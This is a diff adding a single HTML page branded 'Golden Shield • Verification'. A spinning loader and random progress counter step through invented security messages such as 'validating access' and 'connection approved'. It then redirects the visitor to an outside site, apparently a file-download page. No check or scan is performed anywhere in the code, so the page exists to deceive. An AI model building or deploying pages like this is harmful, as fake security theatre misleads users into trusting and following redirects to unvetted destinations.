@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+ 
+<title>🌟 Golden Shield • Verification</title>
+ 
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+ 
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+ 
+body{
+  font-family:'Poppins',sans-serif;
+  background:radial-gradient(circle at top,#1a1200,#000);
+  height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#fff;
+  overflow:hidden;
+}
+ 
+/* glowing particles */
+.spark{
+  position:absolute;
+  width:6px;
+  height:6px;
+  background:#facc15;
+  border-radius:50%;
+  animation:rise 6s linear infinite;
+  opacity:0.7;
+}
+@keyframes rise{
+  from{transform:translateY(0);}
+  to{transform:translateY(-800px);}
+}
+ 
+/* card */
+.card{
+  width:360px;
+  padding:2.2rem;
+  text-align:center;
+  border-radius:20px;
+  background:rgba(255,215,0,0.05);
+  backdrop-filter:blur(18px);
+  border:1px solid rgba(255,215,0,0.2);
+  box-shadow:0 0 40px rgba(250,204,21,0.2);
+}
+ 
+/* title */
+h1{
+  font-size:1.7rem;
+  margin-bottom:5px;
+  color:#facc15;
+}
+ 
+.sub{
+  font-size:0.85rem;
+  color:#fde68a;
+  margin-bottom:1.8rem;
+}
+ 
+/* circle loader */
+.circle{
+  width:130px;
+  height:130px;
+  border-radius:50%;
+  border:6px solid rgba(255,255,255,0.08);
+  border-top:6px solid #facc15;
+  margin:0 auto 1.5rem;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg);}}
+ 
+/* percent */
+.percent{
+  font-size:2.2rem;
+  font-weight:600;
+  color:#fde047;
+  margin-bottom:0.5rem;
+}
+ 
+/* message */
+.msg{
+  font-size:0.95rem;
+  margin-bottom:1rem;
+}
+ 
+/* badge */
+.badge{
+  display:inline-block;
+  padding:6px 14px;
+  border-radius:20px;
+  background:rgba(250,204,21,0.15);
+  border:1px solid rgba(250,204,21,0.3);
+  font-size:0.8rem;
+  color:#fde68a;
+}
+</style>
+</head>
+ 
+<body>
+ 
+<!-- particles -->
+<script>
+for(let i=0;i<50;i++){
+  let s=document.createElement("div");
+  s.className="spark";
+  s.style.left=Math.random()*100+"%";
+  s.style.top=Math.random()*100+"%";
+  s.style.animationDuration=(4+Math.random()*4)+"s";
+  document.body.appendChild(s);
+}
+</script>
+ 
+<div class="card">
+<h1>🌟 Golden Shield</h1>
+<div class="sub">secure verification system</div>
+ 
+  <div class="circle"></div>
+ 
+  <div class="percent" id="percent">0%</div>
+<div class="msg" id="msg">🧭 initializing scan...</div>
+<div class="badge" id="badge">🟡 starting</div>
+</div>
+ 
+<script>
+let progress = 0;
+ 
+const percent = document.getElementById("percent");
+const msg = document.getElementById("msg");
+const badge = document.getElementById("badge");
+ 
+const steps = [
+  ["🧭 initializing scan...", "🟡 starting"],
+  ["🔎 checking pathways...", "📡 scanning"],
+  ["🔑 validating access...", "🔐 verifying"],
+  ["⚙ optimizing route...", "🔁 routing"],
+  ["🛡 strengthening shield...", "💛 securing"],
+  ["✅ connection approved", "✔ safe"],
+  ["🚀 launching access...", "⚡ finalizing"],
+  ["✨ redirecting now...", "➡ moving"]
+];
+ 
+function run(){
+  progress += Math.random()*7;
+ 
+  if(progress >= 100){
+    progress = 100;
+    percent.textContent = "100%";
+    msg.textContent = "✨ redirecting...";
+    badge.textContent = "🚀 done";
+ 
+    setTimeout(()=>{
+      window.location.href = "https://gadgetpilot.site/desire-file/";
+    },1000);
+    return;
+  }
+ 
+  percent.textContent = Math.floor(progress)+"%";
+ 
+  let i = Math.floor((progress/100)*steps.length);
+  msg.textContent = steps[i][0];
+  badge.textContent = steps[i][1];
+ 
+  setTimeout(run,140);
+}
+ 
+run();
+</script>
+ 
+</body>
+</html>
